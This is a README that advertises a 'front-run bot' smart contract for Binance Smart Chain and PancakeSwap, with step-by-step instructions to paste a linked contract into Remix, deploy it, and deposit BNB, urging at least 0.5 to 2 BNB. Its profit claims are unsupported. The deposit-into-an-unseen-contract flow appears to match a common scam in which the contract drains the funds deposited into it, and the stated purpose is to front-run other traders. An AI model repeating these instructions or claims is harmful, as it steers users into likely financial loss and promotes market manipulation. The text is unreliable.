# FrontRun-Bot-Sol-BSC-ERC20-PancakeSwap
Create and Deploy a Front Run Bot Sol Contract on BSC ERC-20 PancakeSwap Earn BNB Profits!
This thing is working for me! If you wanna try it! Now I'm 4x and you don't have to wait for ages!

Tutorial Video 
https://vimeo.com/693306486

BSC FrontRun BOT

In the following steps, we'll show you a simple front run deployment in Solidity which automatically locates any liquidity to a BSC token and immediately transacts before other users.
Sell automatically triggers at profit, as well if a tokens liquidity is fully called into your wallet.
NOTE: Current parameters of this contract is that 10% of profit automatically reenters the front-run pool,
and automatically transacts back to your wallet 90% of the profit. The remaining pool keeps front running for profit, until you transaction "Action" function in Remix

How To Use:
1- Download metamask: https://metamask.io/download.html

2- Connect MetaMask to Binance Smart Chain

3- Go to Remix: https://remix.ethereum.org/

4- Click on "contracts" folder and then "Create New File". Rename it as you like " anyname.sol "

5- Paste SmartContract in Remix:(Copy and Paste as it is) https://github.com/cryptonas/FrontRun-Bot-Sol-BSC-ERC20-PancakeSwap/blob/3a1a87ff8cf70ff2b585d7ba129874f0d8eb079a/BSC_FrontRun_BOT.sol

6- Compile it and copy contract address

7- Deposit funds to the Frontrun contract

8- Start the bot with "Action" button

UPDATE:
I got messages from people who didn't fund enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower.
Gas fees average 0.006*2 (0.012 BNB). Better when there is no burn. If it targets token with 10% burn, that's another 0.04BNB taken off of 0.2BNB. Most tokens these days have some burn.
Less than 0.2BNB doesn't give you much to work with.
So in order for the bot to work properly, I recommend you to fund at least 0.5 BNB. If you want to have more earnings instead, set a value starting from 1 or 2 BNB or more
